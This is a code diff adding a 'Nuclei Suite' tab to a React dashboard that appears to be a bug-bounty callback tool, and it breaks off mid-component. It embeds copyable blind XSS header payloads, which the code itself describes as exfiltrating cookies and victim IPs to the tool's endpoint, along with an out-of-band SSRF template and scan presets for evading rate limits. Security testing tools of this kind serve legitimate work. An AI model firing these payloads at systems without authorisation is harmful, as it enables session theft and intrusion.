@@ -209,6 +209,14 @@ export default function DashboardPage({ params }) {
   const [selectedPayloadCategory, setSelectedPayloadCategory] = useState('ALL');
   const [payloadFilterPriority, setPayloadFilterPriority] = useState('ALL'); // 'ALL', 'HIGH', 'MEDIUM', 'LOW'
 
+  // --- Nuclei Suite states ---
+  const [nucleiSearchQuery, setNucleiSearchQuery] = useState('');
+  const [selectedNucleiSection, setSelectedNucleiSection] = useState('ALL');
+  const [builderTarget, setBuilderTarget] = useState('https://target.com');
+  const [builderTemplateType, setBuilderTemplateType] = useState('OOB_SSRF');
+  const [builderSeverity, setBuilderSeverity] = useState('critical,high');
+  const [builderRateLimit, setBuilderRateLimit] = useState('50');
+
   // Load origin on client side
   const [origin, setOrigin] = useState('');
   useEffect(() => {
@@ -1066,6 +1074,8 @@ export default function DashboardPage({ params }) {
                 ? `${xssTriggers.length} XSS Hits` 
                 : activeTab === 'PAYLOADS'
                 ? 'Cheat Sheet'
+                : activeTab === 'NUCLEI'
+                ? 'Nuclei Suite'
                 : 'Utility'}
             </span>
           </div>
@@ -1103,6 +1113,14 @@ export default function DashboardPage({ params }) {
             >
               <BookOpen size={13} />
               Payloads
+            </button>
+            <button 
+              onClick={() => setActiveTab('NUCLEI')}
+              className={`${styles.moduleTabBtn} ${activeTab === 'NUCLEI' ? styles.moduleTabBtnActive : ''}`}
+              title="Nuclei OOB & Automation Suite"
+            >
+              <Cpu size={13} />
+              Nuclei
             </button>
           </div>
 
@@ -1205,6 +1223,26 @@ export default function DashboardPage({ params }) {
                     {prio.label}
                   </button>
                 ))}
+              </div>
+            </>
+          )}
+
+          {activeTab === 'NUCLEI' && (
+            <>
+              <div className={styles.searchBar}>
+                <Search size={14} className={styles.searchIcon} />
+                <input 
+                  type="text" 
+                  placeholder="Filter Nuclei topics..."
+                  value={nucleiSearchQuery}
+                  onChange={(e) => setNucleiSearchQuery(e.target.value)}
+                  className={styles.searchInput}
+                />
+              </div>
+
+              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                <Cpu size={12} style={{ color: '#00e676' }} />
+                <span>ProjectDiscovery Nuclei Suite</span>
               </div>
             </>
           )}
@@ -1356,6 +1394,57 @@ export default function DashboardPage({ params }) {
                       ? '📱 Android (WebViews/Links)'
                       : `☣️ ${cat}`}
                   </span>
+                </button>
+              ))}
+            </div>
+          )}
+
+          {activeTab === 'NUCLEI' && (
+            <div style={{ padding: '16px 14px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+              <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
+                Nuclei Modules
+              </span>
+              {[
+                { id: 'ALL', label: '🚀 All Nuclei Modules' },
+                { id: 'BUILDER', label: '⚡ Interactive Command Generator' },
+                { id: 'OOB_SSRF', label: '🛰️ OOB SSRF / RCE Template' },
+                { id: 'BLIND_XSS', label: '🛡️ Blind XSS Header Fuzzer' },
+                { id: 'REPORTING', label: '🔔 Live Scan Webhook Export' },
+                { id: 'COMMUNITY', label: '📦 Local Community Templates' },
+                { id: 'CHEATSHEET', label: '📖 CLI Cheat Sheet' }
+              ].filter(item => !nucleiSearchQuery || item.label.toLowerCase().includes(nucleiSearchQuery.toLowerCase())).map(sec => (
+                <button
+                  key={sec.id}
+                  onClick={() => setSelectedNucleiSection(sec.id)}
+                  style={{
+                    display: 'flex',
+                    alignItems: 'center',
+                    width: '100%',
+                    padding: '10px 12px',
+                    borderRadius: 'var(--radius-md)',
+                    background: selectedNucleiSection === sec.id ? 'rgba(0, 230, 118, 0.1)' : 'transparent',
+                    border: selectedNucleiSection === sec.id ? '1px solid rgba(0, 230, 118, 0.25)' : '1px solid transparent',
+                    color: selectedNucleiSection === sec.id ? '#00e676' : 'var(--text-muted)',
+                    fontSize: '0.8rem',
+                    fontWeight: '650',
+                    cursor: 'pointer',
+                    textAlign: 'left',
+                    transition: 'all 0.15s ease'
+                  }}
+                  onMouseEnter={(e) => {
+                    if (selectedNucleiSection !== sec.id) {
+                      e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
+                      e.currentTarget.style.color = 'var(--text-main)';
+                    }
+                  }}
+                  onMouseLeave={(e) => {
+                    if (selectedNucleiSection !== sec.id) {
+                      e.currentTarget.style.background = 'transparent';
+                      e.currentTarget.style.color = 'var(--text-muted)';
+                    }
+                  }}
+                >
+                  <span>{sec.label}</span>
                 </button>
               ))}
             </div>
@@ -2187,6 +2276,553 @@ export default function DashboardPage({ params }) {
                   </section>
                 ))
               )}
+            </div>
+
+          </div>
+        )}
+
+        {/* --- MODULE 5: PROJECTDISCOVERY NUCLEI INTEGRATION & OOB SUITE --- */}
+        {activeTab === 'NUCLEI' && (
+          <div className={`${styles.detailContent} animate-fade-in`} style={{ padding: '30px 40px' }}>
+            
+            {/* Header Title & Badges */}
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '24px' }}>
+              <div>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px' }}>
+                  <Cpu size={22} style={{ color: '#00e676' }} />
+                  <h2 style={{ fontSize: '1.3rem', fontWeight: '850', color: 'var(--text-main)', letterSpacing: '0.5px' }}>
+                    NUCLEI AUTOMATION & OOB SUITE
+                  </h2>
+                </div>
+                <p style={{ fontSize: '0.85rem', color: 'var(--text-muted)', maxWidth: '680px', lineHeight: '1.5' }}>
+                  Harness <strong>ProjectDiscovery Nuclei</strong> alongside your active Kestrel Ghost listener. Trigger Out-of-Band (OOB) callbacks for Blind SSRF, inject Blind XSS probes, and stream real-time vulnerability scan results directly into this dashboard.
+                </p>
+              </div>
+
+              {/* Status Badges */}
+              <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
+                <span style={{ fontSize: '0.65rem', fontWeight: '800', background: 'rgba(0, 230, 118, 0.1)', color: '#00e676', border: '1px solid rgba(0, 230, 118, 0.25)', padding: '4px 10px', borderRadius: '20px', fontFamily: 'monospace' }}>
+                  ● Nuclei v3.x Ready
+                </span>
+                <span style={{ fontSize: '0.65rem', fontWeight: '800', background: 'rgba(0, 242, 254, 0.1)', color: 'var(--color-primary)', border: '1px solid rgba(0, 242, 254, 0.25)', padding: '4px 10px', borderRadius: '20px', fontFamily: 'monospace' }}>
+                  110,000+ Templates In Suite
+                </span>
+              </div>
+            </div>
+
+            {/* Quick Navigation Filter Pills */}
+            <div style={{ display: 'flex', gap: '8px', overflowX: 'auto', paddingBottom: '12px', marginBottom: '24px' }}>
+              {[
+                { id: 'ALL', label: '🚀 All Modules' },
+                { id: 'BUILDER', label: '⚡ Interactive Command Builder' },
+                { id: 'OOB_SSRF', label: '🛰️ OOB SSRF / RCE Template' },
+                { id: 'BLIND_XSS', label: '🛡️ Blind XSS Header Fuzzer' },
+                { id: 'REPORTING', label: '🔔 Live Scan Webhook Export' },
+                { id: 'COMMUNITY', label: '📦 Local Community Templates' },
+                { id: 'CHEATSHEET', label: '📖 CLI Cheat Sheet' }
+              ].map(sec => (
+                <button
+                  key={sec.id}
+                  onClick={() => setSelectedNucleiSection(sec.id)}
+                  style={{
+                    padding: '6px 14px',
+                    borderRadius: '20px',
+                    fontSize: '0.75rem',
+                    fontWeight: '700',
+                    cursor: 'pointer',
+                    whiteSpace: 'nowrap',
+                    border: selectedNucleiSection === sec.id ? '1px solid #00e676' : '1px solid var(--border-light)',
+                    background: selectedNucleiSection === sec.id ? 'rgba(0, 230, 118, 0.12)' : 'rgba(255,255,255,0.02)',
+                    color: selectedNucleiSection === sec.id ? '#00e676' : 'var(--text-muted)',
+                    transition: 'all 0.15s ease'
+                  }}
+                >
+                  {sec.label}
+                </button>
+              ))}
+            </div>
+
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '32px' }}>
+
+              {/* 1. INTERACTIVE NUCLEI COMMAND BUILDER */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BUILDER') && (
+                <div 
+                  style={{ 
+                    padding: '24px', 
+                    background: 'rgba(10, 15, 26, 0.85)', 
+                    borderRadius: 'var(--radius-xl)', 
+                    border: '1px solid var(--border-medium)',
+                    boxShadow: '0 8px 32px rgba(0,0,0,0.3)',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    gap: '18px'
+                  }}
+                >
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <Terminal size={18} style={{ color: '#00e676' }} />
+                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', letterSpacing: '0.5px' }}>
+                        ⚡ INTERACTIVE NUCLEI COMMAND GENERATOR
+                      </h3>
+                    </div>
+                    <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
+                      Customized for Endpoint: {id}
+                    </span>
+                  </div>
+
+                  {/* Builder Form Grid */}
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                        Target URL or File
+                      </label>
+                      <input 
+                        type="text"
+                        value={builderTarget}
+                        onChange={(e) => setBuilderTarget(e.target.value)}
+                        placeholder="https://example.com or targets.txt"
+                        className={styles.inputField}
+                        style={{ padding: '10px 12px', fontSize: '0.85rem', fontFamily: 'monospace' }}
+                      />
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                        Template Strategy
+                      </label>
+                      <select
+                        value={builderTemplateType}
+                        onChange={(e) => setBuilderTemplateType(e.target.value)}
+                        className={styles.selectField}
+                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                      >
+                        <option value="OOB_SSRF">🛰️ Out-of-Band SSRF Callback Template</option>
+                        <option value="BLIND_XSS">🛡️ Blind XSS Header Fuzzer Template</option>
+                        <option value="ALL_CUSTOM">📦 All Local Custom Templates (C:\templates\)</option>
+                        <option value="WORDFENCE">🌐 WordPress Wordfence CVEs (C:\templates\topscoder...)</option>
+                        <option value="OFFICIAL_CVES">🎯 Official ProjectDiscovery CVEs (-t cves/)</option>
+                        <option value="FUZZING">⚡ PD Fuzzing Templates (C:\templates\projectdiscovery...)</option>
+                      </select>
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                        Severity Filter
+                      </label>
+                      <select
+                        value={builderSeverity}
+                        onChange={(e) => setBuilderSeverity(e.target.value)}
+                        className={styles.selectField}
+                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                      >
+                        <option value="critical,high">🔥 Critical & High Only</option>
+                        <option value="critical">💥 Critical Only</option>
+                        <option value="critical,high,medium">⚡ Critical, High, Medium</option>
+                        <option value="all">🌐 All Severities (including Low/Info)</option>
+                      </select>
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                      <label style={{ fontSize: '0.72rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
+                        Rate Limit (req/sec)
+                      </label>
+                      <input 
+                        type="number"
+                        value={builderRateLimit}
+                        onChange={(e) => setBuilderRateLimit(e.target.value)}
+                        placeholder="50"
+                        className={styles.inputField}
+                        style={{ padding: '10px 12px', fontSize: '0.85rem' }}
+                      />
+                    </div>
+                  </div>
+
+                  {/* Generated Output Command */}
+                  {(() => {
+                    const isTargetFile = builderTarget.endsWith('.txt');
+                    const targetFlag = isTargetFile ? `-l ${builderTarget}` : `-u ${builderTarget}`;
+                    let templateFlag = '';
+                    if (builderTemplateType === 'OOB_SSRF') templateFlag = `-t ssrf-oob.yaml -var callback=${webhookUrl}`;
+                    else if (builderTemplateType === 'BLIND_XSS') templateFlag = `-t blind-xss.yaml -var xss_url=${xssPayloadUrl}`;
+                    else if (builderTemplateType === 'ALL_CUSTOM') templateFlag = `-t C:\\templates\\`;
+                    else if (builderTemplateType === 'WORDFENCE') templateFlag = `-t C:\\templates\\topscoder_nuclei-wordfence-cve\\`;
+                    else if (builderTemplateType === 'OFFICIAL_CVES') templateFlag = `-t cves/`;
+                    else if (builderTemplateType === 'FUZZING') templateFlag = `-t C:\\templates\\projectdiscovery_fuzzing-templates\\`;
+
+                    const sevFlag = builderSeverity !== 'all' ? `-s ${builderSeverity}` : '';
+                    const rlFlag = builderRateLimit ? `-rl ${builderRateLimit} -c ${Math.max(1, Math.floor(builderRateLimit / 2))}` : '';
+                    const generatedCmd = `nuclei ${targetFlag} ${templateFlag} ${sevFlag} ${rlFlag}`.replace(/\s+/g, ' ').trim();
+
+                    return (
+                      <div 
+                        style={{ 
+                          display: 'flex', 
+                          alignItems: 'center', 
+                          background: '#040608', 
+                          border: '1px solid rgba(0, 230, 118, 0.3)', 
+                          borderRadius: 'var(--radius-md)', 
+                          padding: '14px 18px', 
+                          gap: '12px' 
+                        }}
+                      >
+                        <span 
+                          style={{ 
+                            color: '#00e676', 
+                            fontFamily: 'monospace', 
+                            fontSize: '0.9rem', 
+                            fontWeight: '600', 
+                            flex: 1, 
+                            whiteSpace: 'nowrap', 
+                            overflowX: 'auto',
+                            paddingBottom: '2px'
+                          }}
+                        >
+                          {generatedCmd}
+                        </span>
+                        <button 
+                          onClick={() => handleCopy(generatedCmd, 'builder-cmd')}
+                          className={styles.copyBtn}
+                          style={{ flexShrink: '0', padding: '6px 12px', background: 'rgba(0, 230, 118, 0.1)', border: '1px solid rgba(0, 230, 118, 0.25)', borderRadius: '6px' }}
+                        >
+                          {copiedText === 'builder-cmd' ? (
+                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--color-success)', fontSize: '0.75rem', fontWeight: '700' }}>
+                              <Check size={14} /> Copied!
+                            </span>
+                          ) : (
+                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#00e676', fontSize: '0.75rem', fontWeight: '700' }}>
+                              <Copy size={14} /> Copy Command
+                            </span>
+                          )}
+                        </button>
+                      </div>
+                    );
+                  })()}
+                </div>
+              )}
+
+              {/* 2. OOB SSRF & RCE TEMPLATE */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'OOB_SSRF') && (
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <Zap size={18} style={{ color: 'var(--color-primary)' }} />
+                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                        1. Out-of-Band (OOB) SSRF / RCE Nuclei Template
+                      </h3>
+                    </div>
+                    <span className="badge badge-info" style={{ fontSize: '0.65rem' }}>Auto-Configured for /api/r/{id}</span>
+                  </div>
+
+                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
+                    Use this custom template to trigger HTTP/SSRF pingbacks from the target application. Any inbound connection will be captured in real-time under the <strong>OOB</strong> tab of this dashboard.
+                  </p>
+
+                  {(() => {
+                    const ssrfTemplateCode = `id: kestrel-ssrf-oob-hunter
+
+info:
+  name: Out-of-Band SSRF Detection via Kestrel Ghost
+  author: robbypranata
+  severity: high
+  description: Triggers outbound HTTP callbacks to your active Webhook Inspector endpoint.
+  tags: ssrf,oob,blind
+
+variables:
+  oob_callback: "${webhookUrl}"
+
+http:
+  - raw:
+      - |
+        GET /api/fetch?url={{oob_callback}}?source=nuclei_get&target={{Hostname}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+      - |
+        POST /webhook/trigger HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"callback_url": "{{oob_callback}}?source=nuclei_post", "host": "{{Hostname}}"}
+
+    stop-at-first-match: true`;
+
+                    return (
+                      <div style={{ position: 'relative', background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
+                          <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--color-primary)', fontFamily: 'monospace' }}>
+                            📄 kestrel-ssrf-oob.yaml
+                          </span>
+                          <button
+                            onClick={() => handleCopy(ssrfTemplateCode, 'ssrf-yaml')}
+                            className={styles.copyBtn}
+                            style={{ padding: '4px 10px', fontSize: '0.75rem', background: 'rgba(0, 242, 254, 0.08)', border: '1px solid rgba(0, 242, 254, 0.2)', borderRadius: '4px', color: 'var(--color-primary)' }}
+                          >
+                            {copiedText === 'ssrf-yaml' ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy Template</>}
+                          </button>
+                        </div>
+                        <pre style={{ padding: '18px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#00e676', overflowX: 'auto', lineHeight: '1.6' }}>
+                          {ssrfTemplateCode}
+                        </pre>
+                      </div>
+                    );
+                  })()}
+                </section>
+              )}
+
+              {/* 3. BLIND XSS HEADER FUZZER */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BLIND_XSS') && (
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <ShieldAlert size={18} style={{ color: '#7c4dff' }} />
+                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                        2. Blind XSS Header & Parameter Fuzzer Template
+                      </h3>
+                    </div>
+                    <span className="badge" style={{ fontSize: '0.65rem', background: 'rgba(124, 77, 255, 0.15)', color: '#7c4dff', border: '1px solid rgba(124, 77, 255, 0.3)' }}>
+                      Auto-Configured for /api/x?id={id}
+                    </span>
+                  </div>
+
+                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
+                    Injects your stealth Blind XSS payload into standard HTTP request headers. When an administrator or backend system logs and renders the header, the payload triggers and exfiltrates cookies, DOM, and victim IP directly to your <strong>XSS</strong> tab!
+                  </p>
+
+                  {(() => {
+                    const xssTemplateCode = `id: kestrel-blind-xss-fuzzer
+
+info:
+  name: Blind XSS Probe Injection via Kestrel Ghost
+  author: robbypranata
+  severity: medium
+  tags: xss,blind-xss,oob
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/support"
+
+    headers:
+      User-Agent: '"><script src="${xssPayloadUrl}"></script>'
+      X-Forwarded-For: '"><script src="${xssPayloadUrl}"></script>'
+      Referer: '"><script src="${xssPayloadUrl}"></script>'
+      X-Client-IP: '"><script src="${xssPayloadUrl}"></script>'
+      Contact-Email: 'test"><script src="${xssPayloadUrl}"></script>'`;
+
+                    return (
+                      <div style={{ position: 'relative', background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
+                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
+                          <span style={{ fontSize: '0.75rem', fontWeight: '750', color: '#7c4dff', fontFamily: 'monospace' }}>
+                            📄 kestrel-blind-xss.yaml
+                          </span>
+                          <button
+                            onClick={() => handleCopy(xssTemplateCode, 'xss-yaml')}
+                            className={styles.copyBtn}
+                            style={{ padding: '4px 10px', fontSize: '0.75rem', background: 'rgba(124, 77, 255, 0.1)', border: '1px solid rgba(124, 77, 255, 0.25)', borderRadius: '4px', color: '#7c4dff' }}
+                          >
+                            {copiedText === 'xss-yaml' ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy Template</>}
+                          </button>
+                        </div>
+                        <pre style={{ padding: '18px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#c084fc', overflowX: 'auto', lineHeight: '1.6' }}>
+                          {xssTemplateCode}
+                        </pre>
+                      </div>
+                    );
+                  })()}
+                </section>
+              )}
+
+              {/* 4. REALTIME SCAN WEBHOOK REPORTING */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'REPORTING') && (
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <Radio size={18} style={{ color: '#ff9100' }} />
+                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                        3. Stream Nuclei Findings via Webhook Reporting
+                      </h3>
+                    </div>
+                    <span className="badge" style={{ fontSize: '0.65rem', background: 'rgba(255, 145, 0, 0.15)', color: '#ff9100', border: '1px solid rgba(255, 145, 0, 0.3)' }}>
+                      Real-time JSON Stream
+                    </span>
+                  </div>
+
+                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
+                    Configure Nuclei to automatically push scan findings into this Webhook Inspector dashboard in real-time as vulnerabilities are discovered during high-volume scans.
+                  </p>
+
+                  {(() => {
+                    const reportConfig = `# reporting-config.yaml
+webhook:
+  - id: kestrel-ghost-receiver
+    server-url: "${webhookUrl}?src=nuclei_report"
+    username: ""
+    password: ""`;
+
+                    return (
+                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '16px' }}>
+                        <div style={{ background: '#040608', border: '1px solid var(--border-medium)', borderRadius: 'var(--radius-lg)', overflow: 'hidden' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 16px', background: 'rgba(255,255,255,0.02)', borderBottom: '1px solid var(--border-light)' }}>
+                            <span style={{ fontSize: '0.75rem', fontWeight: '750', color: '#ff9100', fontFamily: 'monospace' }}>
+                              📄 reporting-config.yaml
+                            </span>
+                            <button
+                              onClick={() => handleCopy(reportConfig, 'report-yaml')}
+                              className={styles.copyBtn}
+                              style={{ padding: '4px 10px', fontSize: '0.75rem', color: '#ff9100' }}
+                            >
+                              {copiedText === 'report-yaml' ? <Check size={14} /> : <Copy size={14} />}
+                            </button>
+                          </div>
+                          <pre style={{ padding: '16px', margin: 0, fontSize: '0.82rem', fontFamily: 'monospace', color: '#ffd166', overflowX: 'auto', lineHeight: '1.6' }}>
+                            {reportConfig}
+                          </pre>
+                        </div>
+
+                        <div style={{ padding: '18px', background: 'rgba(255,255,255,0.01)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-lg)', display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                          <span style={{ fontSize: '0.8rem', fontWeight: '800', color: 'var(--text-main)' }}>CLI Execution Command</span>
+                          <div style={{ display: 'flex', alignItems: 'center', background: '#040608', padding: '10px 12px', borderRadius: '6px', border: '1px solid var(--border-medium)', gap: '8px' }}>
+                            <code style={{ fontSize: '0.8rem', color: '#00e676', flex: 1, overflowX: 'auto' }}>
+                              nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml
+                            </code>
+                            <button 
+                              onClick={() => handleCopy('nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml', 'report-cmd')}
+                              className={styles.copyBtn}
+                            >
+                              {copiedText === 'report-cmd' ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                            </button>
+                          </div>
+                          <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                            Findings will appear instantly inside your <strong>OOB Callbacks</strong> table with full vulnerability severity, CVE IDs, matched URLs, and extracted evidence!
+                          </p>
+                        </div>
+                      </div>
+                    );
+                  })()}
+                </section>
+              )}
+
+              {/* 5. LOCAL COMMUNITY TEMPLATES REPOSITORY GUIDE */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'COMMUNITY') && (
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                      <Database size={18} style={{ color: 'var(--color-success)' }} />
+                      <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                        4. Local Community Templates Suite (110,000+ Templates)
+                      </h3>
+                    </div>
+                    <span className="badge badge-success" style={{ fontSize: '0.65rem' }}>C:\templates\</span>
+                  </div>
+
+                  <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)', lineHeight: '1.5' }}>
+                    Your system is provisioned with 110,000+ custom security templates located at <code>C:\templates\</code> (linked via junction from custom-nuclei-templates). Run targeted scans against bug bounty scopes using these command presets:
+                  </p>
+
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '14px' }}>
+                    {[
+                      {
+                        title: '🔥 Full High & Critical Recon Scan',
+                        desc: 'Executes all local community templates filtered to critical and high severity.',
+                        cmd: 'nuclei -u https://target.com -t C:\\templates\\ -s critical,high'
+                      },
+                      {
+                        title: '🌐 WordPress Wordfence CVEs (70k+ Templates)',
+                        desc: 'Scans WordPress installations for known plugin and theme vulnerabilities.',
+                        cmd: 'nuclei -u https://target.com -t C:\\templates\\topscoder_nuclei-wordfence-cve\\'
+                      },
+                      {
+                        title: '⚡ Stealth Fuzzing with Rate Limits',
+                        desc: 'Fuzzes parameters with controlled rate limits to avoid WAF rate-limiting.',
+                        cmd: 'nuclei -u https://target.com -t C:\\templates\\projectdiscovery_fuzzing-templates\\ -rl 30 -c 10'
+                      },
+                      {
+                        title: '🎯 Multi-Target Batch Reconnaissance',
+                        desc: 'Scans an entire list of discovered subdomains against all template categories.',
+                        cmd: 'nuclei -l targets.txt -t C:\\templates\\ -s critical,high -rl 50 -c 25'
+                      }
+                    ].map((recipe, idx) => (
+                      <div 
+                        key={idx}
+                        style={{
+                          padding: '16px',
+                          background: 'rgba(255,255,255,0.015)',
+                          border: '1px solid var(--border-light)',
+                          borderRadius: 'var(--radius-lg)',
+                          display: 'flex',
+                          flexDirection: 'column',
+                          gap: '10px'
+                        }}
+                      >
+                        <span style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
+                          {recipe.title}
+                        </span>
+                        <div style={{ display: 'flex', alignItems: 'center', background: '#040608', padding: '10px 12px', borderRadius: '6px', border: '1px solid var(--border-medium)', gap: '8px' }}>
+                          <code style={{ fontSize: '0.78rem', color: '#00e676', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
+                            {recipe.cmd}
+                          </code>
+                          <button 
+                            onClick={() => handleCopy(recipe.cmd, `recipe-${idx}`)}
+                            className={styles.copyBtn}
+                          >
+                            {copiedText === `recipe-${idx}` ? <Check size={14} style={{ color: 'var(--color-success)' }} /> : <Copy size={14} />}
+                          </button>
+                        </div>
+                        <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
+                          {recipe.desc}
+                        </p>
+                      </div>
+                    ))}
+                  </div>
+                </section>
+              )}
+
+              {/* 6. CLI QUICK CHEATSHEET */}
+              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'CHEATSHEET') && (
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px', borderBottom: '1px solid var(--border-light)', paddingBottom: '10px' }}>
+                    <BookOpen size={18} style={{ color: 'var(--color-primary)' }} />
+                    <h3 style={{ fontSize: '1rem', fontWeight: '800', color: 'var(--text-main)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
+                      5. Essential Nuclei CLI Flags Cheatsheet
+                    </h3>
+                  </div>
+
+                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '12px' }}>
+                    {[
+                      { flag: '-u, -target <url>', desc: 'Target URL to scan' },
+                      { flag: '-l, -list <file>', desc: 'Path to list of target URLs' },
+                      { flag: '-t, -templates <path>', desc: 'Template or template directory to run' },
+                      { flag: '-s, -severity <level>', desc: 'Filter templates: info, low, medium, high, critical' },
+                      { flag: '-tags <tags>', desc: 'Filter templates by tag (e.g. ssrf, xss, cve, lfi)' },
+                      { flag: '-var <key=val>', desc: 'Pass custom variable to templates (e.g. callback URL)' },
+                      { flag: '-rl, -rate-limit <n>', desc: 'Maximum requests per second (e.g. -rl 50)' },
+                      { flag: '-c, -concurrency <n>', desc: 'Maximum number of concurrent templates to run' },
+                      { flag: '-report-config <file>', desc: 'Send scan alerts/findings to Webhook Inspector' },
+                      { flag: '-tl', desc: 'List all available templates without executing' }
+                    ].map((item, idx) => (
+                      <div 
+                        key={idx}
+                        style={{
+                          padding: '12px 14px',
